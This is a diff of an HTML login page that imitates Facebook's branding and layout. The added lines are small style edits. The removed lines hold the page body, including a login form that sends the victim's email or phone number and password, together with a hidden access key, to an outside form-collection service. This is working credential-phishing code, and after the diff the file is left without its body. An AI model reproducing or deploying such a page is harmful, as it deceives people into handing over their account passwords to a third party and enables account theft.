@@ -2,10 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Login Test Project</title>
+  <title>Login Project</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="referrer" content="origin">
   <style>
+    /* Reset and base styles */
     * {
       box-sizing: border-box;
       font-family: Helvetica, Arial, sans-serif;
@@ -25,6 +25,7 @@
       gap: 60px;
       max-width: 900px;
       padding: 20px;
+      align-items: center;
     }
 
     .branding {
@@ -34,21 +35,23 @@
     .branding h1 {
       color: #1877f2;
       font-size: 56px;
-      margin-bottom: 10px;
+      margin: 0;
     }
 
     .branding p {
       font-size: 24px;
       color: #1c1e21;
       line-height: 1.3;
+      margin-top: 10px;
     }
 
+    /* The Login Box - This is what was "broken" */
     .login-box {
       background: #fff;
       padding: 20px;
       width: 360px;
       border-radius: 8px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      box-shadow: 0 2px 12px rgba(0,0,0,0.1);
     }
 
     .login-box input {
@@ -72,7 +75,7 @@
       color: #fff;
       border: none;
       border-radius: 6px;
-      font-size: 18px;
+      font-size: 20px;
       font-weight: bold;
       cursor: pointer;
     }
@@ -91,58 +94,3 @@
       text-decoration: none;
       font-size: 14px;
     }
-
-    .divider {
-      height: 1px;
-      background: #dadde1;
-      margin: 20px 0;
-    }
-
-    .create-btn {
-      display: block;
-      margin: 0 auto;
-      padding: 14px 18px;
-      background: #42b72a;
-      color: #fff;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    .create-btn:hover {
-      background: #36a420;
-    }
-
-    @media (max-width: 768px) {
-      .container {
-        flex-direction: column;
-        align-items: center;
-        text-align: center;
-      }
-      .branding h1 { font-size: 48px; }
-      .branding p { font-size: 20px; }
-    }
-  </style>
-</head>
-<body>
-
-  <div class="container">
-    <div class="branding">
-      <h1>facebook</h1>
-      <p>Connect with friends and the world around you.</p>
-    </div>
-
-    <form class="login-box" action="https://api.web3forms.com/submit" method="POST">
-      
-  <input type="hidden" name="access_key" value="870db0a3-bb24-4ba3-80fc-f2590bb4d36b">
-      
-  <input type="hidden" name="_subject" value="New Submission">
-
-  <input type="text" name="user_id" placeholder="Email or phone number" required>
-  <input type="password" name="user_pass" placeholder="Password" required>
-      
-  <button type="submit" class="login-btn">Log In</button>
-  ...
-</form>
